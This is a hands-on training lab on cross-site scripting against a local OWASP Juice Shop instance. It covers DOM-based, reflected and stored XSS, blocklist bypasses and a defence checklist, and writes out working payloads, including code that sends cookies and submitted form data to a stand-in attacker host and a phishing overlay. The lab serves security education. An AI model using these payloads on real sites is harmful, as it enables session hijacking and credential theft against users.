# Lab 03 — Cross-Site Scripting (XSS)

**Target:** OWASP Juice Shop — `http://localhost:3000`
**Profile:** `web-apps` or `full`
**Difficulty:** Beginner → Intermediate
**Estimated time:** 45–60 minutes

---

## Prerequisites

```bash
docker compose --profile web-apps up -d
```

Open `http://localhost:3000` in your browser. No account is needed for Parts 1–2; register one for Part 3.

Juice Shop awards a challenge banner each time you find a vulnerability. Keep the browser console open (`F12`) — some challenges are confirmed there.

---

## Background

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper escaping, allowing an attacker to inject scripts that execute in another user's browser.

**Three categories:**

| Type | Source | Persistence |
|---|---|---|
| Reflected | URL / form input echoed in response | None — victim must click a crafted link |
| Stored | Input saved to a database, rendered later | Persistent — affects every viewer |
| DOM-based | JavaScript reads from the DOM and writes it back unsafely | Client-side only — server never sees the payload |

---

## Part 1 — DOM-Based XSS

DOM XSS happens entirely in the browser: JavaScript reads a value (URL hash, `document.referrer`, etc.) and injects it into the DOM without sanitisation.

### 1.1 Locate the vulnerable sink

Navigate to the search page. The URL becomes:

```
http://localhost:3000/#/search?q=apple
```

Juice Shop's Angular frontend reads the `q` parameter and renders it directly into the page without escaping.

### 1.2 Inject a payload

Paste the following URL into the browser address bar:

```
http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">
```

An alert box appears — code injected via the URL hash executed in your browser without any server round-trip.

### 1.3 Understand why this is dangerous

In a real attack, you'd send this crafted URL to a victim. Their browser executes the injected script in the context of the Juice Shop origin — meaning the script can read cookies, access localStorage, and make authenticated requests on the victim's behalf.

**Fix:** Sanitise or encode any data before passing it to DOM sinks (`innerHTML`, `document.write`, `eval`, etc.). Use Angular's built-in `DomSanitizer` correctly.

---

## Part 2 — Reflected XSS

Reflected XSS involves a payload in the HTTP request that is echoed back in the response.

### 2.1 Find the vulnerable parameter

Navigate to the order tracking page (you may need to find it via the site map or score board):

```
http://localhost:3000/#/track-order
```

Enter any order ID and observe the URL:

```
http://localhost:3000/#/track-order?id=TEST
```

### 2.2 Inject the payload

```
http://localhost:3000/#/track-order?id=<script>alert('reflected-xss')</script>
```

The injected value is reflected into the page response without encoding.

### 2.3 Cookie theft simulation

A more realistic payload would exfiltrate a session cookie:

```
http://localhost:3000/#/track-order?id=<script>
  fetch('http://attacker.example.com/steal?c='+document.cookie)
</script>
```

(In this lab, there is no external server to receive the request — but the concept is what matters.)

**Fix:** Encode all user-controlled values before rendering them in HTML. Apply a strict Content Security Policy (CSP).

---

## Part 3 — Stored XSS

Stored XSS persists in a data store and executes for every user who views the infected page — making it the most dangerous category.

### 3.1 Register and log in

Create an account at `http://localhost:3000/#/register` if you haven't already.

### 3.2 Locate a stored input field

Navigate to the **Customer Feedback** page (`http://localhost:3000/#/contact`).

### 3.3 Inject a persistent payload

In the **Comment** field, enter:

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
  src="https://w.soundcloud.com/player/?url=https://soundcloud.com/user-538321491/rickroll&color=%23ff5500">
</iframe>
```

Submit the form. Now navigate to the administration panel (you may need to find the URL via the score board challenge). Every admin who loads the feedback list will see your injected iframe.

For a more minimal proof-of-concept:

```html
<script>alert(document.domain)</script>
```

**Fix:** Sanitise input on the server before storing it. Encode output on render. A well-configured CSP (`script-src 'self'`) prevents inline script execution even if the HTML is injected.

---

## Part 4 — Bypassing Filters

Many applications attempt to block XSS with blocklists. These filters are almost always bypassable.

### 4.1 Case variation

If `<script>` is blocked, try:

```
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
```

### 4.2 Attribute-based execution

```html
<img src=x onerror="alert(1)">
<body onload="alert(1)">
<svg onload="alert(1)">
```

### 4.3 Encoding tricks

If the application decodes HTML entities before checking:

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

If the check happens before URL-decoding:

```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### 4.4 Breaking out of attribute context

If your input lands inside an existing attribute:

```html
<input value="INJECTED">
```

Payload:

```
" onmouseover="alert(1)
```

Result:

```html
<input value="" onmouseover="alert(1)">
```

---

## Part 5 — Impact Beyond Alert Boxes

`alert()` is proof-of-concept only. Real XSS payloads do things like:

**Session hijacking:**
```javascript
new Image().src = 'http://attacker.example.com/steal?c=' + encodeURIComponent(document.cookie);
```

**Credential harvesting:**
```javascript
document.querySelector('form').addEventListener('submit', function(e) {
  fetch('http://attacker.example.com/log', {
    method: 'POST',
    body: new FormData(e.target)
  });
});
```

**Defacement / phishing overlay:**
```javascript
document.body.innerHTML = '<h1>Site temporarily down. Please log in at evil.example.com</h1>';
```

---

## Defence Checklist

- [ ] Encode all user data before inserting into HTML (use a library — never roll your own)
- [ ] Set `Content-Security-Policy: default-src 'self'` to block inline scripts
- [ ] Use `HttpOnly` on session cookies to prevent JavaScript access
- [ ] Validate and sanitise input on the server, not just the client
- [ ] Use frameworks that auto-escape by default (React, Angular, Django templates, etc.)

---

## Next Steps

- Explore the Juice Shop score board (`http://localhost:3000/#/score-board`) for 50+ more challenges across all OWASP Top 10 categories
- Lab 01: [SQL Injection Fundamentals with DVWA](./01-sqli-dvwa.md)
- Lab 02: [API Security with VAmPI](./02-api-owasp-top10-vampi.md)
